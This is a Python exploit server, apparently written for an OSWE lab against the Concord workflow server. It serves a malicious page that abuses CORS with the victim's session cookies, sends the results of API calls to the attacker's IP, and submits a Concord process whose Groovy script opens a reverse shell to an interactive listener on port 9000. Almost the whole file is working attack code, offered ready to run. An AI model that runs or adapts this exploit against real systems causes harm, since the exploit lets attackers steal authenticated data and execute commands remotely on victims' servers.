#!/usr/bin/env python3
"""
OSWE Concord CORS->RCE avtomatlasdirilmis exploit serveri.
- Port 80: zererli index.html serve edir + exfil msg/err query-lerini parse edir
- Port 9000: reverse shell handler (interaktiv)
Istifade: sudo python3 exploit.py <KALI_IP>
"""

import sys
import socket
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, unquote

if len(sys.argv) != 2:
    print(f"Istifade: sudo python3 {sys.argv[0]} <KALI_IP>")
    sys.exit(1)

KALI_IP = sys.argv[1]
HTTP_PORT = 80
SHELL_PORT = 9000

# --- Zererli payload (concord -> internal hostname, OSWE lab daxili) ---
PAYLOAD = f"""<html>
<head>
    <script>
        yml = `
configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"
flows:
  default:
    - script: groovy
      body: |
         String host = "{KALI_IP}";
         int port = {SHELL_PORT};
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {{
             while (pi.available() > 0) so.write(pi.read());
             while (pe.available() > 0) so.write(pe.read());
             while (si.available() > 0) po.write(si.read());
             so.flush();
             po.flush();
             Thread.sleep(50);
             try {{
                 p.exitValue();
                 break;
             }} catch (Exception e) {{}}
         }}
         p.destroy();
         s.close();
`;

        fetch("http://concord:8001/api/service/console/whoami", {{
            credentials: 'include'
        }})
        .then(async (response) => {{
            if (response.status != 401) {{
                let data = await response.text();
                fetch("http://{KALI_IP}/?msg=" + encodeURIComponent(data));
                rce();
            }} else {{
                fetch("http://{KALI_IP}/?msg=UserNotLoggedIn");
            }}
        }});

        function rce() {{
            var ymlBlob = new Blob([yml], {{ type: "application/yml" }});
            var fd = new FormData();
            fd.append('concord.yml', ymlBlob);
            fetch("http://concord:8001/api/v1/process", {{
                method: 'POST',
                credentials: 'include',
                body: fd
            }})
            .then(response => response.text())
            .then(data => {{
                fetch("http://{KALI_IP}/?msg=" + encodeURIComponent(data));
            }})
            .catch(err => {{
                fetch("http://{KALI_IP}/?err=" + encodeURIComponent(err));
            }});
        }}
    </script>
</head>
<body></body>
</html>"""


# --- HTTP server: payload serve + exfil parse ---
class ExploitHandler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass  # default noise-i susdur

    def do_GET(self):
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)

        if 'msg' in qs:
            print(f"[+] EXFIL  <- {unquote(qs['msg'][0])}")
        elif 'err' in qs:
            print(f"[!] ERROR  <- {unquote(qs['err'][0])}")
        elif parsed.path in ('/', '/index.html'):
            print(f"[*] Payload servə olundu -> {self.client_address[0]}")
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(PAYLOAD.encode())
            return

        self.send_response(200)
        self.end_headers()


def start_http():
    srv = ThreadingHTTPServer(('0.0.0.0', HTTP_PORT), ExploitHandler)
    print(f"[*] HTTP payload serveri  : 0.0.0.0:{HTTP_PORT}")
    srv.serve_forever()


# --- Reverse shell handler ---
def start_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', SHELL_PORT))
    s.listen(1)
    print(f"[*] Reverse shell listener : 0.0.0.0:{SHELL_PORT}")

    conn, addr = s.accept()
    print(f"\n[+] SHELL TUTULDU <- {addr[0]}:{addr[1]}\n{'='*45}")

    def recv_loop():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors='replace'))
                sys.stdout.flush()
            except Exception:
                break

    threading.Thread(target=recv_loop, daemon=True).start()

    try:
        while True:
            cmd = input()
            conn.sendall((cmd + "\n").encode())
    except (KeyboardInterrupt, EOFError):
        conn.close()


if __name__ == "__main__":
    threading.Thread(target=start_http, daemon=True).start()
    print(f"[*] Hədəf simulyatora ver  : http://{KALI_IP}/\n")
    try:
        start_shell()  # main thread-də qalır, shell interaktiv işləsin
    except KeyboardInterrupt:
        print("\n[*] Çıxılır.")
